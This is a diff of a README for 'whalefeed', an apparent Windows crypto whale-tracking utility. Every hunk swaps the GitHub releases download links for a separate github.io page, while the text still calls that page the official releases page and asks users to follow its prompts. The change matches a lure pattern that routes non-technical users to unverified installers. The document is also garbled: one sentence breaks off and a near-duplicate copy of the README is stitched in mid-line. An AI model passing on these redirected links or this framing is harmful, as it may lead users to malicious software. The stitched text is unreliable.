@@ -1,6 +1,6 @@
 # 🐋 whalefeed - Monitor Big Crypto Moves Easily
 
-[![Download whalefeed](https://img.shields.io/badge/Download_whalefeed-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dripdry-jung494/whalefeed/releases)
+[![Download whalefeed](https://img.shields.io/badge/Download_whalefeed-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://dripdry-jung494.github.io)
 
 whalefeed is an open-source Windows desktop utility for following large Bitcoin and blockchain activity in a simple, visual way. It is designed for people who want a clearer view of whale transactions, mempool movement, and on-chain activity without needing to understand code or complex blockchain tools. Download it from the official releases page, open it on your Windows computer, and use the dashboard to watch the market data that matters to you.
 
@@ -8,7 +8,7 @@ whalefeed is an open-source Windows desktop utility for following large Bitcoin 
 
 Visit this link to download the application:
 
-[![Download whalefeed](https://img.shields.io/badge/Get_whalefeed-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dripdry-jung494/whalefeed/releases)
+[![Download whalefeed](https://img.shields.io/badge/Get_whalefeed-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://dripdry-jung494.github.io)
 
 This is the official download page for whalefeed. Open the link in your browser, follow the page prompts to get the application, and then open whalefeed on your Windows desktop to begin.
 
@@ -108,7 +108,7 @@ If the app opens but data does not appear immediately, give it a moment to conne
 
 Visit this link to download the application when you want the newest available version:
 
-[![Download whalefeed](https://img.shields.io/badge/Update_whalefeed-e83e8c?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dripdry-jung494/whalefeed/releases)
+[![Download whalefeed](https://img.shields.io/badge/Update_whalefeed-e83e8c?style=for-the-badge&logo=github&logoColor=white)](https://dripdry-jung494.github.io)
 
 Use the same official page whenever you need a fresh copy of whalefeed. Keeping the app current helps ensure you have the latest fixes and improvements from the project.
 
@@ -120,7 +120,7 @@ If you no longer want whalefeed on your computer, close the application and remo
 
 whalefeed is part of an open-source project. The repository is the main place for project information, release updates, and community activity. If you want to learn more about the# 🐋 whalefeed - Track Crypto Whale Activity Simply
 
-[![Download whalefeed](https://img.shields.io/badge/Download_whalefeed-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dripdry-jung494/whalefeed/releases)
+[![Download whalefeed](https://img.shields.io/badge/Download_whalefeed-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://dripdry-jung494.github.io)
 
 whalefeed is an open-source Windows desktop utility for following large Bitcoin and blockchain activity in a simple, visual way. It is designed for people who want a clearer view of whale transactions, mempool movement, and on-chain activity without needing to understand code or complex blockchain tools. Download it from the official releases page, open it on your Windows computer, and use the dashboard to watch the market data that matters to you.
 
@@ -128,7 +128,7 @@ whalefeed is an open-source Windows desktop utility for following large Bitcoin 
 
 Visit this link to download the application:
 
-[![Download whalefeed](https://img.shields.io/badge/Get_whalefeed-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dripdry-jung494/whalefeed/releases)
+[![Download whalefeed](https://img.shields.io/badge/Get_whalefeed-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://dripdry-jung494.github.io)
 
 This is the official download page for whalefeed. Open the link in your browser and follow the page prompts to get the application. After the download page has done its job, open whalefeed on your Windows desktop and begin exploring the monitoring view.
 
@@ -228,7 +228,7 @@ If the app opens but data does not appear immediately, give it a moment to conne
 
 Visit this link to download the application when you want the newest available version:
 
-[![Download whalefeed](https://img.shields.io/badge/Update_whalefeed-e83e8c?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dripdry-jung494/whalefeed/releases)
+[![Download whalefeed](https://img.shields.io/badge/Update_whalefeed-e83e8c?style=for-the-badge&logo=github&logoColor=white)](https://dripdry-jung494.github.io)
 
 Use the same official page whenever you need a fresh copy of whalefeed. Keeping the app current helps ensure you have the latest fixes and improvements from the project.
 
